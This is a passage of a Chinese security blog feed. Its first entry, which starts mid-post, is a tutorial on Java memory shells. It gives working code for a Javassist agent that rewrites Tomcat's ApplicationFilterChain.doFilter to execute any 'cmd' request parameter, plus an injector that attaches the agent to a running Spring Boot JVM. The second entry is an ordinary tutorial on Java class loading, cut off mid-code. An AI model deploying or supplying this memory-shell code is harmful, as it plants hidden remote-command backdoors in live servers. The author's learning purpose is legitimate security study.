ctClass.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个坑就是药在resources目录的文件中添加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.zbz.java_agent_agentmain</span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067911718-31db2331-40ef-401e-a8dc-bbdcd31b6a4d.png" alt=""></p><h3 id="Instrumentation的局限性">Instrumentation的局限性</h3><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：</p><p>premain和agentmain两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p><p>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是private static/final修饰的</li><li>可以修改方法体</li></ol><h3 id="Agent内存马">Agent内存马</h3><p>现在我们可以通过Java Agent技术来修改正在运行JVM中的方法体，那么我们可以Hook一些JVM一定会调用、并且Hook之后不会影响正常业务逻辑的的方法来实现内存马。</p><p>这里我们以Spring Boot为例，来实现一个Agent内存马</p><h4 id="Spring-Boot中的Tomcat">Spring Boot中的Tomcat</h4><p>我们知道，Spring Boot中内嵌了一个embed Tomcat作为其启动容器。既然是Tomcat，那肯定有相应的组件容器。我们先来调试一下SpringBoot，部分调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Context:<span class="number">20</span>, Context_Learn (com.example.spring_controller)</span><br><span class="line">...</span><br><span class="line">(org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:<span class="number">808</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:<span class="number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch:<span class="number">1067</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">963</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">655</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">764</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到会按照责任链机制反复调用ApplicationFilterChain#doFilter()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟到internalDoFilter()方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                              ServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">    <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上两个方法均拥有ServletRequest和ServletResponse，并且hook不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用</p><h4 id="利用Java-Agent实现Spring-Filter内存马">利用Java Agent实现Spring Filter内存马</h4><p>我们复用上面的agentmain-Agent，修改字节码的关键在于transformer()方法，因此我们重写该方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.instrumentation.transformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//添加额外的类搜索路径</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取目标类</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取目标方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置方法体</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            ctMethod.setBody(body);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//返回目标类字节码</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"> </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Inject_Agent_Spring类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent_Spring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;</span>))&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            System.out.println(vmd.displayName());</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动一个简单的Spring Boot项目</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067977588-edc44af3-3c65-40c9-8754-b07f0fa6505f.png" alt=""></p><p>运行Inject_Agent_Spring类，在doFilter方法中注入恶意代码，成功执行<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067985294-d3ab1888-609b-4b3c-a4ca-05446a303b6c.png" alt=""></p><p>上面介绍到的javasist参考：<a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81-Instrumentation">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81-Instrumentation</a></p><h2 id="4-spring内存马">4.spring内存马</h2><p>参考：<a href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#42-spring-interceptor%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#42-spring-interceptor%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC</a></p><p><a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p><p><a href="https://xz.aliyun.com/t/12047?time__1311=mqmhBKD50KAIKiqGNDQbiQvQ%3DxIx9%3DC1roD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-5">https://xz.aliyun.com/t/12047?time__1311=mqmhBKD50KAIKiqGNDQbiQvQ%3DxIx9%3DC1roD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-5</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;开启一个补漏的篇章，内存只是听说过还从来没有细细学过。本篇就记录下自己学习java内存马的过程。&lt;/p&gt;
&lt;h2 id=&quot;1-前置基础&quot;&gt;1.前置基础&lt;/h2&gt;
&lt;p&gt;在开始学下之前我们先来了解什么是servlet容器，这里以tomcat为例。&lt;/p&gt;
&lt;p&gt;web容器的概</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内存马" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Java类加载</title>
    <link href="https://oceanzbz.github.io/post/c664e20c.html"/>
    <id>https://oceanzbz.github.io/post/c664e20c.html</id>
    <published>2024-12-30T05:25:23.000Z</published>
    <updated>2025-03-05T07:24:36.795Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java代码执行流程图">Java代码执行流程图</h2><p>大家通过这个流程图，了解一下我们写好的Java代码是如何执行的，其中要经历类加载器这个流程，我们就来仔细讲讲这里面的知识点。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513555137-37dd6ad4-9f9a-4976-8abb-67ddd906c304.png" alt=""></p><h2 id="类加载子系统">类加载子系统</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513564091-30b1ed54-64d2-47fd-a23a-50869fb87c83.png" alt=""></p><h3 id="类的生命周期">类的生命周期</h3><p>类的生命周期包括：加载、链接、初始化、使用和卸载，其中加载、链接、初始化，属于类加载的过程，我们下面仔细讲解。使用是指我们new对象进行使用，卸载指对象被垃圾回收掉了。</p><h3 id="类加载的过程">类加载的过程</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513591106-f2fbfed9-6aa3-4606-8ee8-3b5e183e95ce.png" alt=""></p><ul><li><strong>第一步：Loading加载</strong></li></ul><p>通过类的全限定名（包名 + 类名），获取到该类的.class文件的二进制字节流</p><p>将二进制字节流所代表的静态存储结构，转化为方法区运行时的数据结构</p><p>在内存中生成一个代表该类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口</p><p>总结：加载二进制数据到内存 —&gt; 映射成jvm能识别的结构 —&gt; 在内存中生成class文件。</p><ul><li><strong>第二步：Linking链接</strong></li></ul><p>链接是指将上面创建好的class类合并至Java虚拟机中，使之能够执行的过程，可分为验证、准备、解析三个阶段。</p><p><strong>① 验证（Verify）</strong></p><p>确保class文件中的字节流包含的信息，符合当前虚拟机的要求，保证这个被加载的class类的正确性，不会危害到虚拟机的安全。</p><p><strong>② 准备（Prepare）</strong></p><p>为类中的静态字段分配内存，并设置默认的初始值，比如int类型初始值是0。被final修饰的static字段不会设置，因为final在编译的时候就分配了</p><p><strong>③ 解析（Resolve）</strong></p><p>解析阶段的目的，是将常量池内的符号引用转换为直接引用的过程（将常量池内的符号引用解析成为实际引用）。如果符号引用指向一个未被加载的类，或者未被加载类的字段或方法，那么解析将触发这个类的加载（但未必触发这个类的链接以及初始化。）</p><p>事实上，解析器操作往往会伴随着 JVM 在执行完初始化之后再执行。 符号引用就是一组符号来描述所引用的目标。符号引用的字面量形式明确定义在《Java 虚拟机规范》的Class文件格式中。直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。</p><p>解析动作主要针对类、接口、字段、类方法、接口方法、方法类型等。对应常量池中的 CONSTANT_Class_info、CONSTANT_Fieldref_info、CONSTANT_Methodref_info等。</p><ul><li><strong>第三步：initialization初始化</strong></li></ul><p>初始化就是执行类的构造器方法init()的过程。</p><p>这个方法不需要定义，是javac编译器自动收集类中所有类变量的赋值动作和静态代码块中的语句合并来的。</p><p>若该类具有父类，jvm会保证父类的init先执行，然后在执行子类的init。</p><h3 id="类加载器的分类">类加载器的分类</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513604616-34957f07-891f-4f50-94b4-d210759faa12.png" alt=""></p><ul><li><strong>第一个：启动类/引导类：Bootstrap ClassLoader</strong></li></ul><p>这个类加载器使用C/C++语言实现的，嵌套在JVM内部，java程序无法直接操作这个类。</p><p>它用来加载Java核心类库，如：JAVA_HOME/jre/lib/rt.jar、resources.jar、sun.boot.class.path路径下的包，用于提供jvm运行所需的包。</p><p>并不是继承自java.lang.ClassLoader，它没有父类加载器</p><p>它加载扩展类加载器和应用程序类加载器，并成为他们的父类加载器</p><p>出于安全考虑，启动类只加载包名为：java、javax、sun开头的类</p><ul><li><strong>第二个：扩展类加载器：Extension ClassLoader</strong></li></ul><p>Java语言编写，由sun.misc.Launcher$ExtClassLoader实现，我们可以用Java程序操作这个加载器</p><p>派生继承自java.lang.ClassLoader，父类加载器为启动类加载器</p><p>从系统属性：java.ext.dirs目录中加载类库，或者从JDK安装目录：jre/lib/ext目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p><ul><li><strong>第三个：应用程序类加载器：Application Classloader</strong></li></ul><p>Java语言编写，由sun.misc.Launcher$AppClassLoader实现。</p><p>派生继承自java.lang.ClassLoader，父类加载器为启动类加载器</p><p>它负责加载环境变量classpath或者系统属性java.class.path指定路径下的类库</p><p>它是程序中默认的类加载器，我们Java程序中的类，都是由它加载完成的。</p><p>我们可以通过ClassLoader#getSystemClassLoader()获取并操作这个加载器</p><ul><li><strong>第四个：自定义加载器</strong></li></ul><p>一般情况下，以上3种加载器能满足我们日常的开发工作，不满足时，我们还可以自定义加载器</p><p>比如用网络加载Java类，为了保证传输中的安全性，采用了加密操作，那么以上3种加载器就无法加载这个类，这时候就需要自定义加载器</p><p><strong>自定义加载器实现步骤</strong></p><p>继承java.lang.ClassLoader类，重写findClass()方法</p><p>如果没有太复杂的需求，可以直接继承URLClassLoader类，重写loadClass方法，具体可参考AppClassLoader和ExtClassLoader。</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz.javajichu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String pathToClass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(String pathToClass)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.pathToClass = pathToClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = loadClassFromFile(name);</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Cannot load class &quot;</span> + name, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] loadClassFromFile(String fileName) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(pathToClass + fileName + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] buffer;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">nextValue</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ((nextValue = inputStream.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteStream.write(nextValue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        buffer = byteStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自定义一个类并编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pers</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayhello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;gggggg&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz.javajichu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, 